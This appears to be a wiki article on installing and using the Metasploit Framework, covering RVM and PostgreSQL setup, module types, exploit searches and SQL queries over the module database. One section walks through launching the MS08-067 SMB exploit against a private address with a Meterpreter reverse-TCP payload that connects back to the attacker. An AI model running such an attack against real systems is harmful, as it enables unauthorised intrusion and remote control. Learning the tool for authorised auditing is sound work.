# Metasploit Framework

From the official site:
:Consider the MSF to be one of the single most useful auditing tools freely available to security professionals today. From a wide array of commercial grade exploits and an extensive exploit development environment, all the way to network information gathering tools and web vulnerability plugins. The Metasploit Framework provides a truly impressive work environment.  The MSF is far more than just a collection of exploits, it's an infrastructure that you can build upon and utilize for your custom needs. This allows you to concentrate on your unique environment, and not have to reinvent the wheel.

Currently, Metasploit requires to setup and configure PostgreSQL on target system to work.
This wiki will show how to get Metasploit working with a PostgreSQL database.

## Installation
Install package . It is optional to follow the RVM setup instructions below.

## Armitage
Armitage is a GUI front end for Metasploit written in Java; it can be installed with the  package.

When running Armitage, #Setting up the database is not optional, and must be followed. It is also mandatory to use a  file.

A sample  file is packaged with Armitage as .

## RVM
Msfconsole requires Ruby and some Ruby#RubyGems to run without error.

Follow the RVM#Installation and RVM#Using RVM articles to install and use Ruby version 3.1.5 (see Metasploit Git Repo) and set it to default.

Once complete, source the newly created RVM installation:

 $ source ~/.rvm/scripts/rvm

Now cd into  and use Ruby#Bundler to install all gems necessary to run Msfconsole:

 $ gem install bundler
 $ bundle install

## Setting up the database
Metasploit can be used without a database, but cache operations like searching would be very slow.  This section shows how to set up Metasploit with Postgresql database server.

Follow the PostgreSQL article to setup / start the service.
Once the service is started and running, run :

 msfdb init --connection-string=postgresql://postgres@localhost:5432/postgres

The database should now be properly initialized, and the connection should be automatically established when running .

Run  to verify that database connection is properly established:

## Usage
There are several interfaces available for Metasploit.  This section will explain how to use , the interface that provides the most features available in MSF.

To start it, simply type .  The prompt will change to  to indicate it is waiting for commands.

## Module types
Everything (scripts, files, programs etc) in Metasploit is a module. There are 6 types of modules:

*  - Modules for helping the attacker in various tasks, like port scanning, version detection or network traffic analysis
*  - The code that takes advantage of a vulnerability and allows the execution of the payload, like triggering buffer overflow or bypassing authentication
*  - The thing that has to be done right after a successful exploit, like establishing a remote connection, starting a meterpreter session or executing some shell commands
*  - Various programs that can be run after successful exploitation and remote connection, like collecting passwords, setting up keyloggers or downloading files
*  - Programs for performing encryption
*  - NOP generators.  NOP is an assembly language instruction which simply does nothing.  The machine code of this instruction is different on each hardware architecture.  NOP instructions are useful for filling the void in executables.

## Searching for exploits
To discover what operating system and software version a target runs, perform a port scan.  With this information, use the  command to search for available exploits.

To search for all exploits targeting Novell on the Linux platform:

 msf > search platform:linux type:exploit name:Novell

To search for all exploits on the Linux platform containing the keyword Apache and filter the results with grep:

 msf > grep RCE search platform:linux type:exploit Apache

To search for specific field, type its name, followed by column and the phrase.  The following search fields are available:

{| class="wikitable"
! style=white-space:nowrap | Search field
! style=white-space:nowrap | Matches
! style=white-space:nowrap | Possible values
! style=white-space:nowrap | DB table & column
|-
|
| style=white-space:nowrap | Passive (client) or Active (server) exploits
| ,
| style=white-space:nowrap |
|-
|
| style=white-space:nowrap | Name and email of module Author
| Any phrase
| style=white-space:nowrap |
|-
|
| style=white-space:nowrap | The module type
| , , , , ,
| style=white-space:nowrap |
|-
|
| style=white-space:nowrap | The path (Name) and the short description
| Any phrase
| ,
|-
|
| style=white-space:nowrap | The target hardware or software platform
| , , , , , , , , , , , , , , , , , , , ,
| style=white-space:nowrap |
|-
| , , ,  or
| The Bugtraq, CVE, Exploit-DB, OSBDB ID or any
| Exploit database entry ID, or a part of upstream report URL
| style=white-space:nowrap |
|-
| (No field)
| All of the above except  and
| Any phrase
| All of the above
|}

See #Searching from the database and #Database search examples for more advanced search queries.

## Using an exploit
After choosing an appropriate exploit, it is time to start hacking!

First, select an exploit using the  command:

 msf > use exploit/windows/smb/ms08_067_netapi

To view information about a module, use the  command:

 msf exploit(ms08_067_netapi) > info exploit/windows/smb/ms08_067_netapi

Running  without arguments will show info about currently selected module.

To view the selected exploit's options, run:

All the required fields must be provided before exploitation.  Here, only the  variable must be specified.  To assign a value to a variable use the  command:

 msf exploit(ms08_067_netapi) > set RHOST 192.168.56.102

Now choose the payload:

 msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp

Choosing a payload (actually, choosing modules in general) will add more options.  Run  again:

Now assign  variable to the address of your computer, where the exploited computer will send connection requests to:

 msf exploit(ms08_067_netapi) > set LHOST 192.168.56.1

Now launch the attack!

 msf exploit(ms08_067_netapi) > exploit

If you are lucky, you will be dropped to a Meterpreter session where you can do anything on the remote computer.

## Tips and tricks
## Searching from the database
Since everything in Metasploit is stored in a database, it is easy to make powerful search queries without the need of the  frontend command.

To start the database interface, run:

 $ psql msf

The information about modules is stored in 8 tables:

{| class="wikitable"
!Table Name
!Contents
|-
|
|The "main" table, describes various details of each module
|-
|
|The action names of auxiliary modules
|-
|
|The target hardware architecture or software platform
|-
|
|Names and emails of module author
|-
|
|Empty (???)
|-
|
|The target operating system.  See also #Popularity of a platform by number of exploits
|-
|
|References to various online exploit databases and reports
|-
|
|The target program name and version of the exploit
|}

Almost all tables have 3 columns: ,  and , except for  table which has 16 columns.

The  values are pointers to the rows of  table.

To see the all the contents of a table, run:

 SELECT * FROM table_name;

Multiple:

* Architecture
* Platform
* Target

Module options:

* module type
* stance
* privileged
* path
* name
* refname
* rank
* privileged
* disclosure date

## Database search examples
The  table contains multiple columns and viewing them all at once is not convenient.  To show only basic information about the modules:

 SELECT id, mtype, refname, disclosure_date, rank, stance, name
 FROM module_details;

Show some information about available modules, include platform information from :

 SELECT module_details.id, mtype, module_platforms.name as platform, refname, DATE(disclosure_date), rank, module_details.name
 FROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id;

Show all client (aggressive) exploits for Windows platform:

 SELECT module_details.id, mtype, module_platforms.name as platform, refname, DATE(disclosure_date), rank, module_details.name
 FROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id
 WHERE module_platforms.name = 'windows'
 AND mtype = 'exploit'
 AND stance = 'aggressive';

Show all exploits for Windows platform with rank >= 500 disclosed after 2013:

 SELECT module_details.id, mtype, module_platforms.name as platform, refname, DATE(disclosure_date), rank, module_details.name
 FROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id
 WHERE module_platforms.name = 'windows'
 AND mtype = 'exploit'
 AND rank >= 500
 AND disclosure_date >= TIMESTAMP '2013-1-1';

Show all aggressive (client) exploits for Windows platform with rank >= 500 and include additional information about module's target:

 SELECT module_details.id, mtype, module_platforms.name as platform, module_details.name, DATE(disclosure_date), rank, module_targets.name as target
 FROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id JOIN module_targets on module_details.id = module_targets.detail_id
 WHERE module_platforms.name = 'windows'
 AND mtype = 'exploit'
 AND stance = 'aggressive'
 AND rank >= 500
 order by target;

## Popularity of a platform by number of exploits
To view the possible  values, and number of available exploits, run from :

 SELECT name, count(*)
 FROM module_platforms
 GROUP BY name
 ORDER BY count DESC;

## Disable the ASCII banner on startup
To disable the banner, run  with / argument:

 $ msfconsole --quiet

## Preserve variable values between sessions
If you do not want the variables to reset when selecting another module and when rerunning  then set it globally via , for example:

 msf > setg RHOST 192.168.56.102

## Troubleshooting
## Cannot click in VNC viewer
If you selected VNC viewer as a payload, but are unable to click or do any actions, that means you forgot to set the  variable to false.  To fix this problem, re-run the exploit with the variable set to :

 msf > set ViewOnly false

## cannot load such file -- robots (LoadError)
If you get an error like this:

 ~/metasploit-framework/lib/metasploit/framework.rb:19:in `require': cannot load such file -- robots (LoadError)
     from ~/metasploit-framework/lib/metasploit/framework.rb:19:in `'
     from ~/metasploit-framework/lib/metasploit/framework/database.rb:1:in `require'
     from ~/metasploit-framework/lib/metasploit/framework/database.rb:1:in `'
     from ~/metasploit-framework/lib/metasploit/framework/parsed_options/base.rb:17:in `require'
     from ~/metasploit-framework/lib/metasploit/framework/parsed_options/base.rb:17:in `'
     from ~/metasploit-framework/lib/metasploit/framework/parsed_options/console.rb:2:in `'
     from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:230:in `const_get'
     from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:230:in `block in constantize'
     from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:229:in `each'
     from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:229:in `constantize'
     from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/core_ext/string/inflections.rb:54:in `constantize'
     from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:73:in `parsed_options_class'
     from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:69:in `parsed_options'
     from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:47:in `require_environment!'
     from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:81:in `start'
     from ./msfconsole:48:in `'

This happens because the file  has incorrect permissions and can be read only by the root user (see the bug report):

To fix this, simply change the permission to be world-readable:

 # chmod o+r /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/robots-0.10.1/lib/robots.rb

## db_connect fails silently
If upon running  you see no output, but later getting a message like this:

 Database not connected or cache not built, using slow search

that probably means that the  service is not running.
